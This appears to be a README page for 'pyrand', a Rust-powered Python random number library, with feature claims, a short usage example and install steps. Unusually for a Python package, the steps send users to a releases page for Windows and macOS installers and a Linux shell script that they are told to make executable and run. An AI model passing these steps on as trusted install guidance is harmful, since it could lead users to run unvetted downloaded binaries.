---
layout: "default"
title: "🚀 pyrand - Fast and Easy Random Number Generation"
description: "🌀 Generate fast, Rust-powered random numbers and distributions in Python with parallel computation support for efficiency and ease."
---
# 🚀 pyrand - Fast and Easy Random Number Generation

## 🔗 Download Now
[![Download pyrand](https://img.shields.io/badge/Download-pyrand-brightgreen)](https://github.com/Zenzeiiii/pyrand/releases)

## 🚀 Getting Started

Welcome to **pyrand**! This software helps you quickly generate random numbers for your Python projects using Rust technology. It is designed to be fast and efficient, making it ideal for anyone needing reliable random number generation.

## 🛠️ Features

- **High-Speed Performance**: Leverage Rust's speed for fast random number generation.
- **Easy Integration**: Simple to add to your existing Python projects.
- **Direct Support for NumPy**: Works well with NumPy arrays for seamless numerical operations.
- **Parallel Processing**: Uses Rayon to improve performance by making use of multiple CPU cores.
- **Type Safety**: Benefits from PyO3 and Rust's type safety for fewer runtime errors.

## 📥 Download & Install

To get started, visit the Releases page to download the latest version of pyrand: [Download pyrand](https://github.com/Zenzeiiii/pyrand/releases). 

### Steps to Install

1. Click the link above to go to the Releases page.
2. Find the latest version of pyrand.
3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
4. Follow the instructions below based on your system.

## 💻 Installation Instructions

### Windows

1. Download the Windows installer or the `.whl` file from the Releases page.
2. If you downloaded the installer, double-click the file to run it. Follow the on-screen instructions.
3. If you downloaded the `.whl` file:
   - Open Command Prompt.
   - Navigate to the folder where the file is located. Use the command `cd path\to\your\file`.
   - Install the package using the command:
     ```
     pip install pyrand-<version>.whl
     ```

### macOS

1. Download the macOS installer or the `.whl` file from the Releases page.
2. If you have the installer, double-click it and follow the instructions.
3. If using the `.whl` file:
   - Open Terminal.
   - Change to the directory containing the file with:
     ```
     cd /path/to/your/file
     ```
   - Execute the command:
     ```
     pip install pyrand-<version>.whl
     ```

### Linux

1. Download the Linux installer or `.whl` file from the Releases page.
2. If you have the installer, give it execute permissions with:
   ```
   chmod +x pyrand-<version>.sh
   ```
   Then run it with:
   ```
   ./pyrand-<version>.sh
   ```
3. If using the `.whl` file:
   - Open your terminal.
   - Navigate to the appropriate directory with:
     ```
     cd /path/to/your/file
     ```
   - Install using:
     ```
     pip install pyrand-<version>.whl
     ```

## 🛠️ System Requirements

To run pyrand smoothly, ensure your system meets the following requirements:

- **Python**: Version 3.6 or later.
- **Operating System**: Recent versions of Windows, macOS, or Linux.
- **Pip**: Ensure you have the latest version of pip installed for package management.

## 📄 Basic Usage

After installation, you can start using pyrand in your Python scripts.

### Example Code

Here is a simple example to get you started:

```python
import pyrand

# Create a random number generator
rng = pyrand.RandomGenerator()

# Generate a random integer between 1 and 10
random_number = rng.randint(1, 10)
print(f'Random number: {random_number}')
```

This example demonstrates how easy it is to generate a random number using pyrand. You can integrate this into your projects as needed.

## 🎉 Contribute

We welcome contributions! If you have ideas for improvements or find a bug, please open an issue or submit a pull request. Join our community and help us make pyrand even better.

## 🔗 Stay Updated

For updates and new releases, keep an eye on our [Releases page](https://github.com/Zenzeiiii/pyrand/releases). You can also follow our repository for notifications about upcoming features and improvements.

Thank you for using pyrand! We hope it serves your random number generation needs effectively.